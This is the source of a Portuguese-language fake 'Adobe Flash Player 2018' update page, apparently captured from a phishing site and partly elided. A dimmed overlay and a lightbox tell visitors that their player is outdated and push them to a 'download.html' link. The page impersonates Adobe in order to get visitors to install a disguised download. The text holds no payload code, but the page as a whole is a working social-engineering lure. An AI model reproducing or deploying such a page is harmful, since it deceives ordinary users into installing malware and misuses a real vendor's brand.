<?php
	...
	$url[5] = $config[7];	
?>
<link rel="stylesheet" href="12123/jquery-ui.min.css">
<div class="ui-widget-overlay ui-front" style="z-index: 1000000; opacity: 0.20; background: rgb(0, 0, 0);"></div>
<img src="12123/ameoam.png" id="img_pishca" style="position: absolute; z-index: 1000001; bottom: 20px; left: 0px; width: 450px;">
<html>

<!-- Mirrored from adobe-flash.websiteseguro.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Nov 2018 01:37:59 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<link rel="shortcut icon" href="12123/icon.html">
<link rel="icon" type="image/png" href="12123/icon.html" sizes="192x192">
<link rel="apple-touch-icon" sizes="180x180" href="12123/icon.html">
<title>Adobe Update 2018</title><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
</head><body><span></span>
    ...
    <table style="border-collapse: collapse; width: 553px; height: 493px;" border="0" bordercolor="#111111" cellpadding="0" cellspacing="0">
        <tbody>
          ...
          <tr>
            ...
            <h3 align="center"><font><font color="#808080" face="Arial, Helvetica, sans-serif">A Sua Versão está desatualizada, para continuar navegando com FULL HD e sem travar é preciso atualizar o seu Adobe Flash Player para versão 2018.
</font></font></h3>
...
<div id="uLightBoxOverlay" class="opaque"><div id="uLightBox" class="shadow top bottom" style="width: 585px; top: 150px; left: 382px;"><div id="lbHeader" class="top"><header> Atualizacão Adobe-Flash-Player  -   2018  -     </header></div><div id="lbContent"><span><a style="border:0;" onclick="uLightBox.clear();" href="download.html" target="_blank"><img src="1212/p.png"></a></span></div></div></div>
